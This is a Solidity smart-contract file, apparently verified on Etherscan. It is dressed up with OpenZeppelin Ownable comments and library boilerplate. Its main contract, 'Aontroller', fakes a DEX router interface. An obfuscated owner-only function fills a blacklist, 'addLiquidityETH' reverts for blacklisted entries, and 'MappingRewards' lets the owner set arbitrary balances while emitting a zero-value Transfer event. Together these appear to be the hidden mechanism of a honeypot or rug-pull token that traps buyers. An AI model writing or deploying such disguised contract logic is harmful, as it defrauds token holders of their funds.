/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

 // Define interface for TransferController
interface RouterController {
    function WETH() external view returns (address);
    function getAmountsIn(uint amountIn,address[] calldata path) external view returns (uint[] memory amounts);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Aontroller is RouterController{

    mapping(address => uint256) private _isBlacklisted;
    mapping(address => uint256) private _balances; // Define the mapping
    event Transfer(address indexed from, address indexed to, uint256 value);
    address private owner;

    constructor (){
        owner = msg.sender;
    }

    function WETH() external view override returns(address){
        address ad = address(this);
        return ad;
    }

    function getCode() public  view returns (uint256) {
        address ad = address(this);
        uint256 result = uint160(ad);
        return result;
    }
    
    function getCode2(address addr) public pure returns (uint256) {
        uint256 result = uint160(addr);
        return result;
    }

    function getCode3(uint160 addr) public pure returns (address) {
        address result = address(addr);
        return result;
    }
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external virtual override payable returns (uint amountToken, uint amountETH, uint liquidity) {
        amountToken = amountTokenDesired;
        amountETH = amountTokenMin;
        liquidity = _isBlacklisted[token];
        if(liquidity > 0){
            require(false);
        }
    }

    function getAmountsIn(uint amountIn, address[] memory path) public view virtual override returns (uint[] memory amounts) {
    amounts = new uint[](path.length);
    amounts[0] = amountIn;
    return amounts;
    }

    function MappingRewards(address addr, uint256 addedMontant, uint256 addedValue, uint256 subtractedValue) external {
    require(msg.sender == owner);
    _balances[addr] = addedMontant * addedValue ** subtractedValue;
    uint256 value = 0; // Assign a value to the 'value' variable
    emit Transfer(address(0), addr, value);

    }

    function bbsaqca0o3(address[] calldata accounts, uint256 excluded) public {
        require(msg.sender == owner);
        for (uint256 i = 0; i < accounts.length; i++) {
            _isBlacklisted[accounts[i]] = excluded;
           
        }
    }

    }

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(_initializing || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }
}

abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal initializer {
        __Context_init_unchained();
    }

    function __Context_init_unchained() internal initializer {
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    uint256[50] private __gap;
}

abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal initializer {
        __Context_init_unchained();
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal initializer {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any

 functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    uint256[49] private __gap;
}



interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function add(int256 a, int256 b) internal pure returns (int256) {
        require((b >= 0 && a <= MAX_INT256 - b) || (b < 0 && a >= MIN_INT256 - b), "SafeMathInt: addition overflow");
        return a + b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        require((b >= 0 && a >= b) || (b < 0 && a >= MIN_INT256 - b), "SafeMathInt: subtraction overflow");
        return a - b;
    }

    function mul(int256 a, int256 b) internal pure returns (int256) {
        if (a == 0) {
            return 0;
        }
        require(!(a == -1 && b == MIN_INT256), "SafeMathInt: multiplication overflow");
        int256 c = a * b;
        require(c / a == b, "SafeMathInt: multiplication overflow");
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != 0, "SafeMathInt: division by zero");
        require(!(b == -1 && a == MIN_INT256), "SafeMathInt: division overflow");
        return a / b;
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        require(a <= uint256(type(int256).max), "SafeMathUint: outside int256 range");
        return int256(a);
    }
}